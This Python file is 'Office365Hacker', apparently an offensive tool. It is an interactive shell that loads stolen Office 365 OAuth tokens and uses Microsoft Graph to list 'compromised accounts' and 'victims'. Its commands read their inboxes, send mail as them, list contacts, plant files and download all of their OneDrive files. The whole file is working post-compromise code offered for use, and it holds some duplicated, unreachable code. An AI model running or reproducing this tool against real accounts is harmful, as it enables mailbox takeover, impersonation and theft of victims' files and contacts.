import json
import requests
import argparse
import os
import readline
from typing import Dict, Any, Optional
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama for colored terminal output
init(autoreset=True)

# Add banner and attribution
BANNER = f"""
{Fore.RED}            
.----------------------------------------------------------------------------.
|                                                                            |
|   ___   __  __ _          _____  __  ____  _   _            _              |
|  / _ \\ / _|/ _(_) ___ ___|___ / / /_| ___|| | | | __ _  ___| | _____ _ __  |
| | | | | |_| |_| |/ __/ _ \\ |_ \\| '_ \\___ \\| |_| |/ _` |/ __| |/ / _ \\ '__| |
| | |_| |  _|  _| | (_|  __/___) | (_) |__) |  _  | (_| | (__|   <  __/ |    |
|  \\___/|_| |_| |_|\\___\\___|____/ \\___/____/|_| |_|\\__,_|\\___|_|\\_\\___|_|    |
|                                                                            |
'----------------------------------------------------------------------------'  
{Style.RESET_ALL}
{Fore.CYAN}Created by:{Style.RESET_ALL} YasserREED
{Fore.CYAN}Twitter:{Style.RESET_ALL} https://x.com/YasserREED
"""

class PathCompleter:
    def __init__(self):
        self.matches = []
        
    def complete(self, text, state):
        if state == 0:
            if text.startswith("./") or text.startswith("../"):
                base_path = text
            else:
                base_path = "./" + text
            if os.path.isdir(os.path.dirname(base_path)):
                dir_path = os.path.dirname(base_path)
                base_name = os.path.basename(base_path)
                try:
                    self.matches = [os.path.join(dir_path, f) + "/" if os.path.isdir(os.path.join(dir_path, f)) 
                                    else os.path.join(dir_path, f)
                                    for f in os.listdir(dir_path) 
                                    if f.startswith(base_name)]
                except OSError:
                    self.matches = []
            else:
                self.matches = []
        try:
            return self.matches[state]
        except IndexError:
            return None

# Enhanced command list with categories
COMMANDS = {
    'General': ['help', 'exit', 'clear'],
    'User Management': ['list_users', 'set user'],
    'Email Operations': ['run read_inbox', 'run send_email', 'run list_contacts'],
    'File Operations': ['run list_files', 'run upload_file', 'run download_file', 'run download_all_files']
}

def flatten_commands():
    return [cmd for category in COMMANDS.values() for cmd in category]

def command_completer(text, state):
    options = [cmd for cmd in flatten_commands() if cmd.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

class Office365Shell:
    def __init__(self, token_file: str):
        self.token_file = token_file
        self.users_db = self.load_tokens()
        self.current_user = None
        self.headers = None
        self.user_id_mapping = {}
        self._create_user_mapping()
        self.prompt = "Office365Hacker > "

    def _create_user_mapping(self) -> None:
        """Creates a mapping of numerical IDs to user_ids"""
        self.user_id_mapping = {str(i): user_id for i, user_id in enumerate(self.users_db.keys(), 1)}

    def load_tokens(self) -> Dict[str, Any]:
        """Load user data from JSON file."""
        try:
            with open(self.token_file, 'r') as file:
                token_data = json.load(file)
                users_db = {}
                for user_key, user_details in token_data.items():
                    users_db[user_key] = {
                        "access_token": user_details.get("accessToken"),
                        "refresh_token": user_details.get("refreshToken"),
                        "expires_on": user_details.get("expiresOn"),
                        "expires_in": user_details.get("expiresIn"),
                        "token_type": user_details.get("tokenType"),
                        "resource": user_details.get("resource"),
                        "user_info": {
                            "family_name": user_details.get("familyName"),
                            "given_name": user_details.get("givenName"),
                            "user_id": user_details.get("userId")
                        }
                    }
                return users_db
        except Exception as e:
            print(f"{Fore.RED}Error loading tokens: {e}{Style.RESET_ALL}")
            return {}

    def format_size(self, size_in_bytes: int) -> str:
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_in_bytes < 1024:
                return f"{size_in_bytes:.2f} {unit}"
            size_in_bytes /= 1024
        return f"{size_in_bytes:.2f} TB"

    def _save_file(self, content: bytes, filename: str, output_dir: str = ".") -> bool:
        """Helper function to save file content to disk"""
        try:
            os.makedirs(output_dir, exist_ok=True)
            file_path = os.path.join(output_dir, filename)
            with open(file_path, "wb") as f:
                f.write(content)
            return True
        except Exception as e:
            print(f"{Fore.RED}Error saving file {filename}: {str(e)}")
            return False

    def _download_file_content(self, url: str, headers: Optional[Dict] = None) -> Optional[bytes]:
        """Helper function to download file content from a URL"""
        try:
            headers = headers or self.headers
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                return response.content
            return None
        except Exception as e:
            print(f"{Fore.RED}Error downloading file content: {str(e)}")
            return None

    def set_user(self, user_input: str = None) -> None:
        """Set the current user based on numerical ID or email."""
        if user_input is None:
            print(f"{Fore.RED}Error: User ID required. Usage: set user <id/email>{Style.RESET_ALL}")
            return

        # Get user ID or email from the mapping or directly from the input
        if user_input in self.user_id_mapping:
            user_id = self.user_id_mapping[user_input]  
        else:
            user_id = user_input

        # Verify if user_id/email exists in the database
        if user_id in self.users_db:
            self.current_user = user_id
            self.headers = {
                'Authorization': f'Bearer {self.users_db[user_id]["access_token"]}',
                'Content-Type': 'application/json'
            }
            print(f"{Fore.GREEN}Successfully set current user to: {self.users_db[user_id]['user_info']['user_id']}{Style.RESET_ALL}")

            # Update the prompt to display the email from users_db directly
            user_email = self.users_db[user_id]['user_info']['user_id']
            self.prompt = f"Office365Hacker@{user_email} > "
        else:
            print(f"{Fore.RED}Error: Invalid user ID or email. Use 'list_users' to see available users.{Style.RESET_ALL}")


    def list_users(self):
        """Lists users from users_db."""
        if not self.users_db:
            print(f"{Fore.RED}No users found in the token database.")
            return

        print(f"{Fore.BLUE}[*] Listing compromised Office 365 accounts...\n{Style.RESET_ALL}")
        
        # Create a table header without Tenant ID
        header = f"""
{Fore.YELLOW}+{'-'*4}+{'-'*40}+{'-'*30}+
|{Fore.CYAN} ID {Fore.YELLOW}|{Fore.CYAN} Email{' '*34}{Fore.YELLOW}| {Fore.CYAN}Name{' '*25}{Fore.YELLOW}|"""
        
        print(header)
        print(f"{Fore.YELLOW}+{'-'*4}+{'-'*40}+{'-'*30}+")

        # Print each user's basic information in the table
        for numerical_id, (user_id, details) in enumerate(self.users_db.items(), 1):
            user_info = details["user_info"]
            email = user_info['user_id'][:38] + '..' if len(user_info['user_id']) > 38 else user_info['user_id']
            full_name = f"{user_info['given_name']} {user_info['family_name']}"
            name = full_name[:28] + '..' if len(full_name) > 28 else full_name
            
            print(f"{Fore.YELLOW}|{Fore.GREEN} {numerical_id:2} {Fore.YELLOW}|{Fore.GREEN} {email:<38} {Fore.YELLOW}|{Fore.GREEN} {name:<28} {Fore.YELLOW}|")
        
        print(f"{Fore.YELLOW}+{'-'*4}+{'-'*40}+{'-'*30}+{Style.RESET_ALL}")

        # Print additional details for each user
        print(f"\n{Fore.BLUE}[*] Detailed Information:{Style.RESET_ALL}\n")
        for numerical_id, (user_id, details) in enumerate(self.users_db.items(), 1):
            user_info = details["user_info"]
            expires_in_seconds = details["expires_in"]
            expires_in_minutes = expires_in_seconds // 60  # Convert seconds to minutes
            print(f"{Fore.YELLOW}[Victim {numerical_id}]{Style.RESET_ALL}")
            print(f"{Fore.CYAN}User ID:{Style.RESET_ALL} {user_info['user_id']}")
            print(f"{Fore.CYAN}Given Name:{Style.RESET_ALL} {user_info['given_name']}")
            print(f"{Fore.CYAN}Family Name:{Style.RESET_ALL} {user_info['family_name']}")
            print(f"{Fore.CYAN}Token Type:{Style.RESET_ALL} {details['token_type']}")
            print(f"{Fore.CYAN}Expires In (seconds/min):{Style.RESET_ALL} {expires_in_seconds} / {expires_in_minutes} min")
            print(f"{Fore.CYAN}Expires On:{Style.RESET_ALL} {details['expires_on']}")
            print(f"{Fore.CYAN}Resource:{Style.RESET_ALL} {details['resource']}")
            print(f"{Fore.YELLOW}{'-'*70}{Style.RESET_ALL}\n")

        # Print summary
        print(f"{Fore.BLUE}[*] Summary:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Total compromised accounts:{Style.RESET_ALL} {len(self.users_db)}")
        print(f"\n{Fore.YELLOW}Tip: Use 'set user <ID>' with the ID number shown in the table to select a user{Style.RESET_ALL}")

    def download_file(self, file_name: Optional[str] = None, output_dir: str = ".") -> bool:
        """Download a single file from OneDrive"""
        if file_name is None:
            file_name = input(f"{Fore.CYAN}Enter the file name to download from OneDrive: ")

        print(f"Searching for '{file_name}' in OneDrive...")
        search_url = f"https://graph.microsoft.com/v1.0/me/drive/root/search(q='{file_name}')"
        
        try:
            search_response = requests.get(search_url, headers=self.headers)
            if search_response.status_code != 200:
                print(f"{Fore.RED}Error searching for file: {search_response.status_code}")
                return False

            files = search_response.json().get("value", [])
            if not files:
                print(f"{Fore.YELLOW}File '{file_name}' not found in OneDrive.")
                return False

            file_info = files[0]
            download_url = file_info.get("@microsoft.graph.downloadUrl")
            if download_url:
                content = requests.get(download_url).content
            else:
                file_id = file_info.get("id")
                if not file_id:
                    print(f"{Fore.RED}Error: Unable to retrieve file information.")
                    return False
                download_url = f"https://graph.microsoft.com/v1.0/me/drive/items/{file_id}/content"
                content = requests.get(download_url, headers=self.headers).content

            file_path = os.path.join(output_dir, file_name)
            with open(file_path, "wb") as f:
                f.write(content)
            print(f"{Fore.GREEN}✓ '{file_name}' downloaded successfully!")
            return True

        except Exception as e:
            print(f"{Fore.RED}Error downloading file: {str(e)}")
            return False # Download a single file from OneDrive
        if file_name is None:
            file_name = input(f"{Fore.CYAN}Enter the file name to download from OneDrive: ")
        
        print(f"Searching for '{file_name}' in OneDrive...")
        search_url = f"https://graph.microsoft.com/v1.0/me/drive/root/search(q='{file_name}')"
        
        try:
            search_response = requests.get(search_url, headers=self.headers)
            if search_response.status_code != 200:
                print(f"{Fore.RED}Error searching for file: {search_response.status_code}")
                return False

            files = search_response.json().get("value", [])
            if not files:
                print(f"{Fore.YELLOW}File '{file_name}' not found in OneDrive.")
                return False

            file_info = files[0]
            
            # Try downloading using direct download URL first
            download_url = file_info.get("@microsoft.graph.downloadUrl")
            if download_url:
                content = self._download_file_content(download_url)
            else:
                # Fall back to using file ID
                file_id = file_info.get("id")
                if not file_id:
                    print(f"{Fore.RED}Error: Unable to retrieve file information.")
                    return False
                
                download_url = f"https://graph.microsoft.com/v1.0/me/drive/items/{file_id}/content"
                content = self._download_file_content(download_url, self.headers)

            if content and self._save_file(content, file_name, output_dir):
                print(f"{Fore.GREEN}✓ '{file_name}' downloaded successfully!")
                return True
                
            return False

        except Exception as e:
            print(f"{Fore.RED}Error downloading file: {str(e)}")
            return False
    
    def download_all_files(self) -> None:
        """Download all files from OneDrive"""
        print(f"{Fore.BLUE}Fetching all files from OneDrive...")
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_dir = f"onedrive_files_{timestamp}"
            os.makedirs(output_dir, exist_ok=True)

            files_url = "https://graph.microsoft.com/v1.0/me/drive/root/children"
            response = requests.get(files_url, headers=self.headers)
            
            if response.status_code != 200:
                print(f"{Fore.RED}Error fetching files list: {response.status_code}")
                return

            files = response.json().get("value", [])
            if not files:
                print(f"{Fore.YELLOW}No files found in OneDrive.")
                return

            print(f"{Fore.GREEN}Found {len(files)} files. Starting download...")
            
            successful_downloads = 0
            for file_info in files:
                file_name = file_info.get("name", "unknown_file")
                print(f"\n{Fore.CYAN}Downloading: {file_name}")
                
                download_url = file_info.get("@microsoft.graph.downloadUrl")
                if download_url:
                    content = requests.get(download_url).content
                else:
                    file_id = file_info.get("id")
                    if not file_id:
                        print(f"{Fore.RED}Error: Unable to retrieve file information for {file_name}")
                        continue
                    download_url = f"https://graph.microsoft.com/v1.0/me/drive/items/{file_id}/content"
                    content = requests.get(download_url, headers=self.headers).content

                file_path = os.path.join(output_dir, file_name)
                with open(file_path, "wb") as f:
                    f.write(content)
                successful_downloads += 1
                print(f"{Fore.GREEN}✓ '{file_name}' downloaded successfully!")

            print(f"\n{Fore.GREEN}Download complete! Successfully downloaded {successful_downloads} out of {len(files)} files.")
            print(f"Files saved in directory: {output_dir}")

        except Exception as e:
            print(f"{Fore.RED}Error in download_all_files: {str(e)}")

    def run(self) -> None:
        print(BANNER)
        print(f"{Fore.YELLOW}Type 'help' to see available commands.\n")
        
        while True:
            try:
                command = input(f"\n{Fore.RED}Office365Hacker > {Style.RESET_ALL}").strip()
                
                if command == "list_users":
                    self.list_users()
                elif command == "download_file":
                    self.download_file()
                elif command == "download_all_files":
                    self.download_all_files()
                elif command.startswith("set user"):
                    self.set_user(command.split(" ")[2] if len(command.split(" ")) > 2 else None)
                    break
                elif command == "help":
                    self.show_help()
                else:
                    print(f"{Fore.RED}Unknown command. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit.")
            except Exception as e:
                print(f"{Fore.RED}Error: {str(e)}")
    
    def handle_run_command(self, command: str) -> None:
        if not self.current_user:
            print(f"{Fore.RED}Error: No user selected. Use 'set user' first.")
            return
            
        cmd = command.split(" ", 1)[1] if len(command.split(" ", 1)) > 1 else ""
        
        if cmd == "read_inbox":
            self.read_inbox_messages()
        elif cmd == "send_email":
            self.send_email()
        elif cmd == "list_contacts":
            self.list_contacts()
        elif cmd == "list_files":
            self.list_onedrive_files()
        elif cmd == "upload_file":
            self.upload_to_onedrive()
        elif cmd == "download_file":
            self.download_file()
        elif cmd == "download_all_files":
            self.download_all_files()
        else:
            print(f"{Fore.RED}Unknown run command. Type 'help' for available commands.")

    def list_contacts(self) -> None:
        print(f"{Fore.BLUE}Fetching Contacts...")
        url = "https://graph.microsoft.com/v1.0/me/contacts"
        response = requests.get(url, headers=self.headers)
        if response.status_code == 200:
            contacts = response.json().get("value", [])
            if contacts:
                print(f"\n{Fore.CYAN}Found {len(contacts)} contacts:")
                for i, contact in enumerate(contacts, 1):
                    print(f"\n{Fore.GREEN}Contact {i}:")
                    print(f"Name: {contact.get('displayName', 'N/A')}")
                    print(f"Email: {contact.get('emailAddresses', [{'address': 'N/A'}])[0]['address']}")
                    if 'businessPhones' in contact and contact['businessPhones']:
                        print(f"Phone: {contact['businessPhones'][0]}")
            else:
                print(f"{Fore.YELLOW}No contacts found.")
        else:
            print(f"{Fore.RED}Error fetching contacts: {response.status_code}")

    def list_onedrive_files(self) -> None:
        print(f"{Fore.BLUE}Fetching OneDrive Files...")
        url = "https://graph.microsoft.com/v1.0/me/drive/root/children"
        response = requests.get(url, headers=self.headers)
        
        if response.status_code == 200:
            files = response.json().get("value", [])
            if files:
                print(f"\n{Fore.CYAN}Found {len(files)} files:")
                for i, file in enumerate(files, 1):
                    print(f"\n{Fore.GREEN}File {i}:")
                    print(f"Name: {file.get('name', 'N/A')}")
                    print(f"Size: {self.format_size(file.get('size', 0))}")
                    modified = datetime.fromisoformat(file.get('lastModifiedDateTime', '').replace('Z', '+00:00'))
                    print(f"Last Modified: {modified.strftime('%Y-%m-%d %H:%M:%S')}")
            else:
                print(f"{Fore.YELLOW}No files found.")
        elif response.status_code == 400 and "Tenant does not have a SPO license" in response.text:
            print(f"{Fore.RED}Error: Looks the vicitm don't have a SharePoint Online license. OneDrive access is unavailable.")
        else:
            print(f"{Fore.RED}Error fetching files: {response.status_code}, {response.text}")

    def upload_to_onedrive(self) -> None:
        # Temporarily set the completer for file paths
        path_completer = PathCompleter()
        readline.set_completer(path_completer.complete)
        readline.parse_and_bind("tab: complete")
        
        file_path = input(f"{Fore.CYAN}Enter the local file path to upload: ")

        # Reset the completer back to command completion after entering the file path
        readline.set_completer(command_completer)
        readline.parse_and_bind("tab: complete")

        # Check if the file path exists
        if not os.path.exists(file_path):
            print(f"{Fore.RED}Error: File not found: {file_path}")
            return

        # Prompt for the desired file name on OneDrive
        onedrive_filename = input(f"{Fore.CYAN}Enter the desired file name on OneDrive: ")
        url = f"https://graph.microsoft.com/v1.0/me/drive/root:/{onedrive_filename}:/content"

        try:
            # Upload the file to OneDrive
            with open(file_path, 'rb') as f:
                print(f"{Fore.YELLOW}Uploading file...")
                response = requests.put(url, headers=self.headers, data=f)
            if response.status_code in [201, 200]:
                print(f"{Fore.GREEN}✓ File '{onedrive_filename}' uploaded successfully!")
            else:
                print(f"{Fore.RED}Error uploading file. Status code: {response.status_code}")
        except Exception as e:
            print(f"{Fore.RED}Error uploading file: {str(e)}")
    
    def read_inbox_messages(self) -> None:
        print(f"{Fore.BLUE}Reading Inbox Messages...")
        url = "https://graph.microsoft.com/v1.0/me/messages"
        response = requests.get(url, headers=self.headers)
        if response.status_code == 200:
            messages = response.json().get("value", [])
            if messages:
                print(f"\n{Fore.CYAN}Found {len(messages)} recent messages:")
                for i, message in enumerate(messages[:10], 1):
                    print(f"\n{Fore.GREEN}Message {i}:")
                    print(f"Subject: {message['subject']}")
                    print(f"From: {message['from']['emailAddress']['address']}")
                    print(f"Received: {datetime.fromisoformat(message['receivedDateTime'].replace('Z', '+00:00')).strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Preview: {message['bodyPreview']}")
            else:
                print(f"{Fore.YELLOW}No messages found.")
        else:
            print(f"{Fore.RED}Error fetching messages: {response.status_code}")

    def send_email(self) -> None:
        print(f"{Fore.CYAN}=== Compose New Email ===")
        to_email = input(f"{Fore.CYAN}To: ")
        subject = input(f"{Fore.CYAN}Subject: ")
        print(f"{Fore.CYAN}Body (Enter '.' on a new line to finish):")
        
        body_lines = []
        while True:
            line = input()
            if line.strip() == '.':
                break
            body_lines.append(line)
        
        body = '\n'.join(body_lines)
        
        url = "https://graph.microsoft.com/v1.0/me/sendMail"
        email_data = {
            "message": {
                "subject": subject,
                "body": {"contentType": "Text", "content": body},
                "toRecipients": [{"emailAddress": {"address": to_email}}]
            }
        }
        
        print(f"{Fore.YELLOW}Sending email...")
        response = requests.post(url, headers=self.headers, json=email_data)
        if response.status_code == 202:
            print(f"{Fore.GREEN}✓ Email sent successfully!")
        else:
            print(f"{Fore.RED}Error sending email: {response.status_code}")

    def show_help(self) -> None:
        help_text = f"""
        {Fore.RED}=== Office365Hacker Interactive Shell Commands ==={Style.RESET_ALL}
        {Fore.CYAN}Created by:{Style.RESET_ALL} YasserREED
        {Fore.CYAN}Twitter:{Style.RESET_ALL} https://x.com/YasserREED

        """
        for category, commands in COMMANDS.items():
            help_text += f"\n{Fore.CYAN}{category}:{Style.RESET_ALL}\n"
            for cmd in commands:
                help_text += f"    {Fore.GREEN}{cmd}{Style.RESET_ALL}\n"
        
        print(help_text)

    def run(self) -> None:
        """Main command loop for the shell."""
        print(BANNER)
        print(f"{Fore.YELLOW}Type 'help' to see available commands.\n")

        readline.set_completer(command_completer)
        readline.parse_and_bind("tab: complete")

        while True:
            try:
                command = input(f"\n{Fore.RED}Office365Hacker{Fore.CYAN}{'@' + self.current_user if self.current_user else ''}{Style.RESET_ALL} > ").strip()
                
                if command == "help":
                    self.show_help()
                elif command == "clear":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(BANNER)  # Reprint banner after clear
                elif command == "list_users":
                    self.list_users()
                elif command.startswith("set user"):
                    self.set_user(command.split(" ")[2] if len(command.split(" ")) > 2 else None)
                elif command.startswith("run"):
                    self.handle_run_command(command)
                elif command == "exit":
                    print(f"{Fore.RED}Thanks for using Office365Hacker!")
                    break
                else:
                    print(f"{Fore.RED}Unknown command. Type 'list_users' to view users or 'set user <ID>' to select a user.")
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit.")
            except Exception as e:
                print(f"{Fore.RED}Error: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="Office365Hacker - Interactive shell for Office365 API exploitation")
    parser.add_argument('--token_file', type=str, required=True, help="Path to the token data JSON file")
    args = parser.parse_args()

    try:
        shell = Office365Shell(args.token_file)
        shell.run()
    except FileNotFoundError:
        print(f"{Fore.RED}Error: Token file not found. Please provide a valid token file path.")
    except json.JSONDecodeError:
        print(f"{Fore.RED}Error: Invalid token file format. Please provide a valid JSON file.")
    except Exception as e:
        print(f"{Fore.RED}An unexpected error occurred: {str(e)}")

if __name__ == "__main__":
    main()